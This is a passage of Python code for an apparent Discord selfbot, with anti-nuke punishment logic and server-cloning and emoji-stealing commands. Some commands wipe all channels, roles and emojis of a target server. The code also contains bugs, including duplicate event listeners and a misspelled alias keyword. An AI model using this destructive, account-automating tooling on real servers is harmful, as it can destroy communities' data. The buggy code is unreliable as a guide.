            f"<:white_arrow:1290693789824061461> **Status :** {'Enabled ✅' if antinuke_status else 'Disabled ❌'}\n"
            f"<:white_arrow:1290693789824061461> **Punishment :** {punishment}\n"
            f"<:white_arrow:1290693789824061461> **Log Channel :** {f'<#{log_channel_id}>' if isinstance(log_channel_id, int) else 'Not Set'}\n"
        )
        await send(ctx,"Antinuke configuration",message)


    @staticmethod
    def load_json(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                return json.load(file)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"Error loading JSON: {e}")
            return {}

    def save_antinuke_settings(self):
        with open("database/antinuke.json", "w") as f:
            json.dump(self.antinuke_settings, f, indent=4)

    async def send_log(self, guild, embed):
        guild_id = str(guild.id)
        antinuke_settings = self.load_json("database/antinuke.json")

        if guild_id in antinuke_settings and "log_channel" in antinuke_settings[guild_id]:
            channel = guild.get_channel(antinuke_settings[guild_id]["log_channel"])
            if channel:
                webhooks = await channel.webhooks()
                webhook = next((w for w in webhooks if w.name == "AntiNuke Log"), None)

                if not webhook:
                    webhook = await channel.create_webhook(name="AntiNuke Log")

                await webhook.send(embed=embed, username="AntiNuke Logs", avatar_url=self.bot.user.avatar.url)

    async def punish(self, guild, executor, action_id):
        guild_id = str(guild.id)
        antinuke_settings = self.load_json("database/antinuke.json")
        whitelist_settings = self.load_json("database/whitelist.json")

        antinuke_status = antinuke_settings.get(guild_id, {}).get("enabled", False)
        if not antinuke_status:
            return
        if executor.id == self.bot.user.id:
            return

        whitelist_status = whitelist_settings.get(guild_id, {}).get(str(executor.id), [])
        if str(action_id) in map(str, whitelist_status):
            return 
        punishment = antinuke_settings.get(guild_id, {}).get("punishment", "ban")
        action_name = {
            1: "Ban",
            2: "Kick",
            3: "Guild Update",
            4: "Emoji Update",
            5: "Role Create",
            6: "Role Delete",
            7: "Role Update",
            8: "Channel Create",
            9: "Channel Delete",
            10: "Channel Update",
            11: "Webhook Create",
            12: "Webhook Delete",
            13: "Webhook Update",
            14: "Member Role Update",
            15: "Mention @\u200beveryone/@\u200bhere",
            16: "Bot Add"

        }.get(action_id, f"Unknown ({action_id})")

        try:
            if punishment == "ban":
                await guild.ban(executor, reason="Anti-Nuke Protection")
            elif punishment == "kick":
                await guild.kick(executor, reason="Anti-Nuke Protection")
        except discord.Forbidden:
            pass

        embed = discord.Embed(
            title=f"🚨 {selfbot_name}  Antinuke 🚨",
            description=f"{executor.mention} has been punished for violating Anti-Nuke protection.",
            color=discord.Color.orange(),
        )
        embed.add_field(name="👤 Executor", value=f"{executor.mention} ({executor.id})", inline=False)
        embed.add_field(name="⚡ Action", value=action_name, inline=False)
        embed.add_field(name="🚨 Punishment", value=punishment, inline=False)
        embed.add_field(name="⚠️ Reason", value="Anti-Nuke Protection", inline=False)        
        embed.set_thumbnail(url=executor.avatar.url)
        embed.set_footer(text=f"Punished at {time()}")
        await self.send_log(guild, embed)

    async def get_audit_executor(self, guild, action_type):
        try:
            async for entry in guild.audit_logs(limit=1, action=action_type):
                if entry:
                    return entry.user
        except (discord.Forbidden, discord.HTTPException):
            pass
        return None 

    async def handle_event(self, guild, action_id, action_type):
        executor = await self.get_audit_executor(guild, action_type)
        if executor:
            await self.punish(guild, executor, action_id)

    @commands.Cog.listener()
    async def on_member_ban(self, guild, user):
        await self.handle_event(guild, 1, discord.AuditLogAction.ban)

    @commands.Cog.listener()
    async def on_member_remove(self, member):
        await self.handle_event(member.guild, 2, discord.AuditLogAction.kick)

    @commands.Cog.listener()
    async def on_guild_update(self, before, after):
        await self.handle_event(after, 3, discord.AuditLogAction.guild_update)

    @commands.Cog.listener()
    async def on_guild_emojis_update(self, guild, before, after):
        await self.handle_event(guild, 4, discord.AuditLogAction.emoji_update)

    @commands.Cog.listener()
    async def on_guild_role_create(self, role):
        await self.handle_event(role.guild, 5, discord.AuditLogAction.role_create)

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role):
        await self.handle_event(role.guild, 6, discord.AuditLogAction.role_delete)

    @commands.Cog.listener()
    async def on_guild_role_update(self, before, after):
        await self.handle_event(after.guild, 7, discord.AuditLogAction.role_update)

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        await self.handle_event(channel.guild, 8, discord.AuditLogAction.channel_create)

    @commands.Cog.listener()
    async def on_guild_channel_delete(self, channel):
        await self.handle_event(channel.guild, 9, discord.AuditLogAction.channel_delete)

    @commands.Cog.listener()
    async def on_guild_channel_update(self, before, after):
        await self.handle_event(after.guild, 10, discord.AuditLogAction.channel_update)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 11, discord.AuditLogAction.webhook_create)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 12, discord.AuditLogAction.webhook_delete)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 13, discord.AuditLogAction.webhook_update)

    @commands.Cog.listener()
    async def on_member_update(self, before, after):
        if before.roles != after.roles:
            await self.handle_event(after.guild, 14, discord.AuditLogAction.member_role_update)

    @commands.Cog.listener()
    async def on_message(self, message:discord.Message):
        if "@everyone" in message.content or "@here" in message.content:
            if message.mention_everyone:
                await self.punish(message.guild,message.author,15,message)

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if member.bot:
            await self.handle_event(member.guild, 16, discord.AuditLogAction.bot_add)
class ServerCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def get_guild(self, guild_id):
        return self.bot.get_guild(guild_id) or await self.bot.fetch_guild(guild_id)

    def _safe_emoji_name(self, name: str, fallback: str = "emoji") -> str:
        cleaned = re.sub(r"[^a-zA-Z0-9_]", "_", (name or "").strip())
        cleaned = re.sub(r"_+", "_", cleaned).strip("_").lower()
        if len(cleaned) < 2:
            cleaned = fallback
        return cleaned[:32]

    @commands.command()
    async def listroles(self, ctx):
        """List all roles in the server."""
        await ctx.message.delete()
        if not ctx.guild:
            await send(ctx, "Roles Info", "❌ This command can only be used in a server.")
            return
        roles = ', '.join([role.name for role in ctx.guild.roles])
        await send(ctx, f"Roles ({len(ctx.guild.roles)})", roles)

    @commands.command()
    async def listbots(self, ctx):
        """List all bots in the server."""
        await ctx.message.delete()
        if not ctx.guild:
            await send(ctx, "Bots Info", "❌ This command can only be used in a server.")
            return
        bots = [member for member in ctx.guild.members if member.bot]
        bot_list = ', '.join([bot.name for bot in bots])
        await send(ctx, f"Bots ({len(bots)})", bot_list)

    @commands.command()
    async def deleteallemojis(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        if not guild:
            await send(ctx, "Delete Emojis", "❌ This command can only be used in a server.")
            return

        emojis = guild.emojis
        if not emojis:
            await send(ctx, "Delete Emojis", "❌ No emojis found in this server.")
            return

        deleted_static, deleted_animated, failed = 0, 0, 0
        failed_list = []

        status_msg = await ctx.send(f"🗑 **Starting to delete {len(emojis)} emojis...**")

        for emoji in emojis:
            try:
                await emoji.delete()
                if emoji.animated:
                    deleted_animated += 1
                else:
                    deleted_static += 1
            except discord.HTTPException as e:
                failed += 1
                failed_list.append(f"{emoji.name} ({e})")
            
            await asyncio.sleep(1)  # Prevent hitting rate limits

        try:
            await status_msg.delete()
        except:
            pass

        summary = f"✅ **Deleted {deleted_static} static & {deleted_animated} animated emojis**\n❌ **{failed} failed.**"
        if failed_list:
            summary += "\n🚫 **Failed Emojis:**\n" + "\n".join(failed_list[:5])

        await send(ctx, "Delete Emojis Summary", summary)

    @commands.command()
    async def find(self, ctx, *, keyword: str):
        """Search for messages containing a specific keyword."""
        await ctx.message.delete()
        messages = await ctx.channel.history(limit=100).flatten()
        found = [msg.content for msg in messages if keyword.lower() in msg.content.lower()]
        if found:
            await send(ctx, "Search Results", "🔍 Found messages:\n" + "\n".join(found[:5]))
        else:
            await send(ctx, "Search Results", "<:CROSS_TDG:1321149916201881683> No messages found containing that keyword.")

    @commands.command()
    async def react(self, ctx, message_id: int, emoji: str):
        await ctx.message.delete()
        try:
            channel_id = ctx.channel.id
            if emoji.startswith("<") and emoji.endswith(">"):
                emoji_id = emoji.split(":")[-1].replace(">", "")
                emoji_name = emoji.split(":")[1]
                emoji_param = f"{emoji_name}:{emoji_id}"
            else:
                from urllib.parse import quote
                emoji_param = quote(emoji)

            await ctx.bot.http.request(
                discord.http.Route(
                    "PUT",
                    "/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
                    channel_id=channel_id,
                    message_id=message_id,
                    emoji=emoji_param
                )
            )
            await send(ctx, "Reaction", "<:Tick:1290693799361777665> Reaction added successfully.")
        except discord.NotFound:
            await send(ctx, "Reaction", "<:CROSS_TDG:1321149916201881683> Message not found.")
        except discord.HTTPException as e:
            await send(ctx, "Reaction", f"<:CROSS_TDG:1321149916201881683> Failed to react: {str(e)}")

    @commands.command()
    async def unreact(self, ctx, message_id: int, emoji: str):
        await ctx.message.delete()
        try:
            channel_id = ctx.channel.id
            if emoji.startswith("<") and emoji.endswith(">"):
                emoji_id = emoji.split(":")[-1].replace(">", "")
                emoji_name = emoji.split(":")[1]
                emoji_param = f"{emoji_name}:{emoji_id}"
            else:
                from urllib.parse import quote
                emoji_param = quote(emoji)

            await ctx.bot.http.request(
                discord.http.Route(
                    "DELETE",
                    "/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
                    channel_id=channel_id,
                    message_id=message_id,
                    emoji=emoji_param
                )
            )
            await send(ctx, "Reaction", "<:Tick:1290693799361777665> Reaction removed successfully.")
        except discord.NotFound:
            await send(ctx, "Reaction", "<:CROSS_TDG:1321149916201881683> Message not found.")
        except discord.HTTPException as e:
            await send(ctx, "Reaction", f"<:CROSS_TDG:1321149916201881683> Failed to remove reaction: {str(e)}")

    @commands.command(name="set_topic")
    async def set_topic(self, ctx, *, topic):
        await ctx.message.delete()
        await ctx.channel.edit(topic=topic)
        await send(ctx, "Channel Topic", f"# 📝 Topic set to:\n> {topic}")

    @commands.command(name="delete_channel")
    async def delete_channel(self, ctx, channel: discord.TextChannel):
        await ctx.message.delete()
        await channel.delete()
        await send(ctx, "Delete Channel", f"# 🗑️ Channel `{channel.name}` deleted")

    @commands.command(name="rename_channel")
    async def rename_channel(self, ctx, *, new_name):
        await ctx.message.delete()
        await ctx.channel.edit(name=new_name)
        await send(ctx, "Rename Channel", f"# ✏️ Channel renamed to `{new_name}`")

    @commands.command(name="create_category")
    async def create_category(self, ctx, *, name):
        await ctx.message.delete()
        await ctx.guild.create_category(name=name)
        await send(ctx, "Create Category", f"# 🗂️ Category `{name}` created")

    @commands.command(name="renamerole")
    async def renamerole(self, ctx, role: discord.Role, *, new_name: str):
        await ctx.message.delete()
        try:
            old_name = role.name
            await role.edit(name=new_name, reason=f"Renamed by {ctx.author}")
            await send(ctx, "Rename Role", f"Role `{old_name}` has been renamed to `{new_name}`.")
        except discord.Forbidden:
            await send(ctx, "Rename Role", "I don't have permission to edit that role.")
        except discord.HTTPException as e:
            await send(ctx, "Rename Role", f"Failed to rename role: {e}")

    @commands.command()
    async def copy(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()            
        content = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"    
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                      
            f"<:botupdate:1290700047629160508> | **Clone Emojis** **:** **`{prefix}cemojis [from_g_id] [to_g_id]`**\n"
            f"<:botupdate:1290700047629160508> | **Clone Roles** **:** **`{prefix}croles [from_g_id] [to_g_id]`**\n"
            f"<:botupdate:1290700047629160508> | **Clone Channels** **:** **`{prefix}cchannels [from_g_id] [to_g_id]`**\n"
            f"<:botupdate:1290700047629160508> | **Clone Server** **:** **`{prefix}copyserver [from_g_id] [to_g_id]`**\n"
            f"<:botupdate:1290700047629160508> | **Steal Emoji** **:** **`{prefix}steal <emoji>`**\n"
            f"<:botupdate:1290700047629160508> | **Download Guild Emojis** **:** **`{prefix}downloadguildemoji [guild_id]`**\n"
            f"<:botupdate:1290700047629160508> | **Mass Emoji Add (ZIP)** **:** **`{prefix}massemojiadd <optional_name>`**\n"
            f"<:botupdate:1290700047629160508> | **Backup Servers** **:** **`{prefix}backupservers`**\n"
            f"<:botupdate:1290700047629160508> | **Restore Servers** **:** **`{prefix}restoreservers`**\n"
            f"<:botupdate:1290700047629160508> | **Backup Friends** **:** **`{prefix}backupfriends`**\n"
            f"<:botupdate:1290700047629160508> | **Restore Friends** **:** **`{prefix}restorefriends`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"        
        )
        await send(ctx, "<:devs:1290693770567749652>__Copy Commands__<:Titanz:1281243489635405827>",content)

    @commands.command(aliases=['cemojis', 'cloneemojis'])
    async def copyemojis(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        success = 0

        if not from_guild or not to_guild:
            return await ctx.send("Invalid server ID(s). Make sure the bot is in both servers.")

        prompt = await ctx.send("Delete existing emojis in the destination server? (y/n)")

        def check(message):
            return (
                message.author == ctx.author
                and message.channel == ctx.channel
                and message.content.lower() in ["y", "n", "yes", "no"]
            )

        try:
            reply = await self.client.wait_for("message", timeout=30, check=check)
        except asyncio.TimeoutError:
            return await prompt.edit(content="Timed out. Command cancelled.")

        if reply.content.lower() in ["y", "yes"]:
            for emoji in to_guild.emojis:
                try:
                    await emoji.delete()
                except Exception:
                    pass

        async with aiohttp.ClientSession() as session:
            for emoji in from_guild.emojis:
                try:
                    async with session.get(str(emoji.url)) as resp:
                        if resp.status == 200:
                            image = await resp.read()
                            await to_guild.create_custom_emoji(
                                name=emoji.name,
                                image=image
                            )
                            success += 1
                except Exception:
                    pass

        await send(
            ctx,
            "Copy-Emojis",
            f"Successfully copied {success} emojis from `{from_guild.name}` to `{to_guild.name}`."       
        )

    @commands.command(aliases=["fge", "guildemojis"])
    async def formatguildemojis(self, ctx, guild_id: int):
        await ctx.message.delete()

        try:
            guild = await self.get_guild(guild_id)
        except Exception as e:
            return await ctx.send(f"❌ Failed to fetch guild:\n```{type(e).__name__}: {e}```")

        if not guild:
            return await ctx.send("❌ Invalid guild ID.")

        filename = f"guild_emojis_{guild.id}.txt"

        try:
            with open(filename, "w", encoding="utf-8") as f:
                for emoji in guild.emojis:
                    if emoji.animated:
                        f.write(f"<a:{emoji.name}:{emoji.id}>\n")
                    else:
                        f.write(f"<:{emoji.name}:{emoji.id}>\n")
        except Exception as e:
            return await ctx.send(f"❌ Failed to save file:\n```{type(e).__name__}: {e}```")

        await ctx.send(
            f"✅ Saved **{len(guild.emojis)}** emojis from `{guild.name}`.",
            file=discord.File(filename)
        )

        try:
            os.remove(filename)
        except Exception:
            pass
            
    @commands.command(alisas=['croles','cloneroles'])
    async def copyroles(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        if not from_guild or not to_guild:
            return await senderror(ctx, "Error", "Invalid server ID(s). Make sure the bot is in both servers.")
        for role in to_guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception:
                    pass
        existing_roles = {role.name: role for role in to_guild.roles}
        for role in reversed(from_guild.roles):
            if role.is_default():
                continue
            if role.name in existing_roles:
                continue
            await to_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        await send(ctx, "Copy-Roles", f"Successfully copied all roles from `{from_guild.name}` to `{to_guild.name}`.")
    
    @commands.command(aliases=['cchannels','clonechannels'])
    async def copychannels(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        if not from_guild or not to_guild:
            return await senderror(ctx, "Error", "Invalid server ID(s). Make sure the bot is in both servers.")
        for channel in to_guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass        
        category_mapping = {}
        for category in from_guild.categories:
            new_category = await to_guild.create_category(category.name, position=category.position)
            category_mapping[category.id] = new_category
        
        for channel in from_guild.text_channels + from_guild.voice_channels:
            overwrites = {to_guild.get_role(target.id): overwrite for target, overwrite in channel.overwrites.items() if to_guild.get_role(target.id)}
            category = category_mapping.get(channel.category_id)
            if isinstance(channel, discord.TextChannel):
                await to_guild.create_text_channel(channel.name, category=category, position=channel.position, overwrites=overwrites)
            elif isinstance(channel, discord.VoiceChannel):
                await to_guild.create_voice_channel(channel.name, category=category, position=channel.position, overwrites=overwrites)
        
        await send(ctx, "Copy-Channels", f"Successfully copied all channels from `{from_guild.name}` to `{to_guild.name}`.")

    @commands.command(aliases=['csrv', 'cserver', 'copys', 'copysrv'])
    async def copyserver(self, ctx, from_guild_id: int, target_guild_id: int):
        await ctx.message.delete()
        source_guild = self.bot.get_guild(from_guild_id)
        target_guild = self.bot.get_guild(target_guild_id)

        if not source_guild or not target_guild:
            await ctx.send("**Could not find the guild you mentioned!**", delete_after=30)
            return

        for emojis in target_guild.emojis:
            try:
                await emojis.delete()
            except Exception:
                pass
            
        for sticker in await target_guild.fetch_stickers():
            try:
                await sticker.delete()
            except Exception:
                pass

        for channel in target_guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        for role in target_guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception:
                    pass


        # Copy roles
        role_map = {}
        roles = sorted(source_guild.roles, key=lambda role: role.position, reverse=True)
        for role in roles:
            if role.name != "@everyone":
                try:
                    new_role = await target_guild.create_role(
                        name=role.name,
                        permissions=role.permissions,
                        color=role.color,
                        hoist=role.hoist,
                        mentionable=role.mentionable
                    )
                    role_map[role.id] = new_role
                except Exception:
                    pass

        # Copy categories and channels
        category_map = {}
        for category in source_guild.categories:
            try:
                overwrites = {}
                for target, perms in category.overwrites.items():
                    if isinstance(target, discord.Role):
                        new_role = role_map.get(target.id) or target_guild.default_role
                        overwrites[new_role] = perms
                new_category = await target_guild.create_category(name=category.name, overwrites=overwrites)
                category_map[category.id] = new_category
                

                for channel in category.channels:
                    await self.clone_channel(channel, target_guild, new_category, role_map)
            except Exception:
                pass

        # Clone uncategorized channels
        for channel in source_guild.channels:
            if not channel.category:
                await self.clone_channel(channel, target_guild, None, role_map)

        # Copy emojis
        async with aiohttp.ClientSession() as session:
            for emoji in source_guild.emojis:
                try:
                    emoji_data = await emoji.read()
                    await target_guild.create_custom_emoji(name=emoji.name, image=emoji_data)
                
                except Exception:
                    pass
        await send(ctx, "Copy-Server", f"Successfully copied Full server from `{source_guild.name}` to `{target_guild.name}`.")

    async def clone_channel(self, channel, target_guild, category, role_map):
        try:
            overwrites = {}
            for target, perms in channel.overwrites.items():
                if isinstance(target, discord.Role):
                    new_role = role_map.get(target.id) or target_guild.default_role
                    overwrites[new_role] = perms

            if isinstance(channel, discord.TextChannel):
                await target_guild.create_text_channel(
                    name=channel.name,
                    topic=channel.topic,
                    position=channel.position,
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw,
                    overwrites=overwrites,
                    category=category
                )
            elif isinstance(channel, discord.VoiceChannel):
                await target_guild.create_voice_channel(
                    name=channel.name,
                    bitrate=channel.bitrate,
                    user_limit=channel.user_limit,
                    position=channel.position,
                    overwrites=overwrites,
                    category=category
                )
           
        except Exception:
            pass

    @commands.command(name='steal')
    async def steal(self, ctx, emoji: str = None):
        await ctx.message.delete()
        if not ctx.message.reference and not emoji:
            return await senderror(ctx, "Missing Reply", "You need to reply to a message with a custom emoji or provide one as an argument.")

        if not ctx.guild.me.guild_permissions.manage_emojis:
            return await senderror(ctx, "Permission Error", "I need the `Manage Emojis and Stickers` permission to steal emojis.")
        if ctx.message.reference:
            try:
                target_message = await ctx.channel.fetch_message(ctx.message.reference.message_id)
            except discord.NotFound:
                return await senderror(ctx, "Message Not Found", "The replied message could not be found.")

        emoji_to_steal = None

        if emoji:
            emoji_to_steal = emoji
        else:
            # Extract emoji from replied message
            custom_emoji_match = re.search(r'<a?:\w+:\d+>', target_message.content)
            if custom_emoji_match:
                emoji_to_steal = custom_emoji_match.group()
            else:
                return await senderror(ctx, "Emoji Missing", "Couldn't find a custom emoji in the replied message.")

        # Parse the emoji
        emoji_regex = r'<(a?):(\w+):(\d+)>'
        match = re.match(emoji_regex, emoji_to_steal)

        if not match:
            return await senderror(ctx, "Invalid Emoji", "That's not a valid custom emoji from another server.")

        is_animated, name, emoji_id = match.groups()
        emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{'gif' if is_animated else 'png'}"

        # Download emoji
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji_url) as response:
                if response.status != 200:
                    return await senderror(ctx, "Download Failed", "Couldn’t download the emoji image.")
                image_data = await response.read()

        # Upload to current server
        try:
            new_emoji = await ctx.guild.create_custom_emoji(
                name=name,
                image=image_data
            )
        except discord.HTTPException as e:
            return await senderror(ctx, "Upload Failed", f"Failed to upload emoji: `{e}`")

        return await send(ctx, "Emoji Stolen", f"Emoji `{new_emoji.name}` was successfully added to this server!\n{new_emoji}")

    @commands.command()
    async def downloadguildemoji(self, ctx, guild_id: int):
        await ctx.message.delete()
        status = await ctx.send("`⏳ Downloading emojis...`")

        try:
            guild = await self.get_guild(guild_id)
        except Exception as e:
            return await status.edit(content=f"`❌ Failed to fetch guild: {type(e).__name__}: {e}`")

        if not guild:
            return await status.edit(content="`❌ Invalid guild ID.`")

        os.makedirs("emojis", exist_ok=True)
        file_paths = []

        for emoji in guild.emojis:
            try:
                ext = "gif" if emoji.animated else "png"
                emoji_name = self._safe_emoji_name(emoji.name, "emoji")
                file_path = os.path.join(
                    "emojis",
                    f"{emoji_name}_{emoji.id}.{ext}"
                )

                data = await emoji.read()

                with open(file_path, "wb") as f:
                    f.write(data)

                file_paths.append(file_path)

            except Exception as e:
                print(f"Failed to download {emoji.name}: {type(e).__name__}: {e}")

        if not file_paths:
            return await status.edit(content="`❌ Failed to download any emojis.`")

        if len(file_paths) == 1:
            await ctx.send(
                "`✅ Emoji Downloaded:`",
                file=discord.File(file_paths[0])
            )
            os.remove(file_paths[0])
        else:
            zip_path = "emojis.zip"

            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for file_path in file_paths:
                    zipf.write(file_path, arcname=os.path.basename(file_path))
                    os.remove(file_path)

            await ctx.send(
                f"`✅ Downloaded {len(file_paths)} emojis:`",
                file=discord.File(zip_path)
            )

            os.remove(zip_path)

        if os.path.exists("emojis") and not os.listdir("emojis"):
            os.rmdir("emojis")

        await status.delete()

    @commands.command()
    async def massemojiadd(self, ctx, emoji_name: str = None):
        await ctx.message.delete()
        if not ctx.message.attachments:
            return await ctx.send("❌ Please attach a ZIP file containing emojis.")

        zip_attachment = ctx.message.attachments[0]
        if not zip_attachment.filename.lower().endswith(".zip"):
            return await ctx.send("❌ The attached file must be a ZIP archive.")

        status_msg = await ctx.send("📥 Downloading and extracting ZIP file...")

        zip_path = f"./temp_{ctx.author.id}.zip"
        extract_folder = f"./extracted_{ctx.author.id}"
        os.makedirs(extract_folder, exist_ok=True)

        async with aiohttp.ClientSession() as session:
            async with session.get(zip_attachment.url) as resp:
                if resp.status != 200:
                    return await ctx.send("❌ Failed to download ZIP file.")
                with open(zip_path, "wb") as f:
                    f.write(await resp.read())

        try:
            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(extract_folder)
        except zipfile.BadZipFile:
            os.remove(zip_path)
            os.rmdir(extract_folder)
            return await status_msg.edit(content="❌ Invalid ZIP file.")

        os.remove(zip_path)

        valid_extensions = (".png", ".jpg", ".jpeg", ".gif")
        image_files = []
        for root, _, files in os.walk(extract_folder):
            for f in files:
                if f.lower().endswith(valid_extensions):
                    image_files.append(os.path.join(root, f))
        if not image_files:
            os.rmdir(extract_folder)
            return await status_msg.edit(content="❌ No valid images found in the ZIP file.")

        prefix_prompt = await ctx.send("✍️ Type prefix for emoji names (or type `skip`).")

        def check(m):
            return m.author.id == ctx.author.id and m.channel.id == ctx.channel.id

        try:
            prefix_msg = await self.bot.wait_for("message", check=check, timeout=45)
            user_prefix = prefix_msg.content.strip()
            try:
                await prefix_msg.delete()
            except Exception:
                pass
        except asyncio.TimeoutError:
            user_prefix = "skip"
            await ctx.send("⏱️ Timeout reached. Using `skip` (no prefix).")

        try:
            await prefix_prompt.delete()
        except Exception:
            pass

        use_prefix = "" if user_prefix.lower() == "skip" else self._safe_emoji_name(user_prefix, "")
        if use_prefix and not use_prefix.endswith("_"):
            use_prefix = f"{use_prefix}_"

        guild = ctx.guild
        added_static, added_animated, failed = 0, 0, 0
        skipped_existing, skipped_slots = 0, 0
        failed_list = []
        emoji_limit = guild.emoji_limit
        existing_static = len([e for e in guild.emojis if not e.animated])
        existing_animated = len([e for e in guild.emojis if e.animated])
        existing_names = {e.name.lower() for e in guild.emojis}
        await status_msg.edit(content=f"🚀 Starting emoji add... Found `{len(image_files)}` files.")

        api_headers = {"Authorization": self.bot.http.token, "Content-Type": "application/json"}
        create_url = f"https://discord.com/api/v9/guilds/{guild.id}/emojis"

        async def create_emoji_via_api(name: str, image_bytes: bytes, is_animated: bool):
            mime = "gif" if is_animated else "png"
            img_b64 = base64.b64encode(image_bytes).decode("ascii")
            payload = {"name": name, "image": f"data:image/{mime};base64,{img_b64}"}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
                for _ in range(4):
                    async with session.post(create_url, headers=api_headers, json=payload) as resp:
                        if resp.status in (200, 201):
                            return True, None
                        if resp.status == 429:
                            data = await resp.json()
                            await asyncio.sleep(float(data.get("retry_after", 3)) + 0.5)
                            continue
                        err = await resp.text()
                        return False, f"HTTP {resp.status}: {err[:160]}"
            return False, "Request timed out/retried too many times"

        for idx, file_path in enumerate(image_files):
            file_name = os.path.basename(file_path)
            is_animated = file_name.lower().endswith(".gif")

            if is_animated and existing_animated + added_animated >= emoji_limit:
                skipped_slots += 1
                continue
            if not is_animated and existing_static + added_static >= emoji_limit:
                skipped_slots += 1
                continue

            with open(file_path, "rb") as image_data:
                image_bytes = image_data.read()

            base = emoji_name or os.path.splitext(file_name)[0] or f"emoji_{idx+1}"
            final_name = self._safe_emoji_name(f"{use_prefix}{base}", f"emoji_{idx+1}")
            if final_name.lower() in existing_names:
                skipped_existing += 1
                continue

            try:
                ok, err = await create_emoji_via_api(final_name, image_bytes, is_animated)
                if not ok:
                    failed += 1
                    failed_list.append(f"{file_name} ({err})")
                    continue
                existing_names.add(final_name.lower())
                if is_animated:
                    added_animated += 1
                else:
                    added_static += 1
            except Exception as e:
                failed += 1
                failed_list.append(f"{file_name} ({e})")

            if (idx + 1) % 5 == 0:
                await status_msg.edit(
                    content=f"⏳ Processing... `{idx+1}/{len(image_files)}` | added `{added_static + added_animated}` | skipped `{skipped_existing + skipped_slots}` | failed `{failed}`"
                )

            await asyncio.sleep(2)

        try:
            for root, dirs, files in os.walk(extract_folder, topdown=False):
                for file_name in files:
                    os.remove(os.path.join(root, file_name))
                for dir_name in dirs:
                    os.rmdir(os.path.join(root, dir_name))
            os.rmdir(extract_folder)
        except Exception as e:
            await ctx.send(f"⚠ Failed to delete extracted folder: {str(e)}")

        summary = (
            f"✅ **Added {added_static} static & {added_animated} animated emojis**\n"
            f"⏭ **Skipped {skipped_existing} existing-name emojis**\n"
            f"📦 **Skipped {skipped_slots} due to emoji slots full**\n"
            f"❌ **{failed} failed** due to errors."
        )
        if failed_list:
            summary += "\n🚫 **Failed Emojis:**\n" + "\n".join(failed_list[:5])
        await status_msg.edit(content=summary)

    @commands.command()
    async def removeprefixall(self, ctx, prefix: str):
        await ctx.message.delete()
        if not ctx.guild:
            return await senderror(ctx, "Remove Prefix", "This command can only be used in a server.")
        if not prefix:
            return await senderror(ctx, "Remove Prefix", "Please provide a prefix to remove.")

        removed, skipped, failed = 0, 0, 0
        failed_list = []
        lower_prefix = prefix.lower()
        existing_names = {e.name.lower() for e in ctx.guild.emojis}

        for emoji in ctx.guild.emojis:
            if not emoji.name.lower().startswith(lower_prefix):
                skipped += 1
                continue

            new_name_raw = emoji.name[len(prefix):]
            new_name = self._safe_emoji_name(new_name_raw, "")
            if len(new_name) < 2:
                failed += 1
                failed_list.append(f"{emoji.name} -> invalid resulting name")
                continue

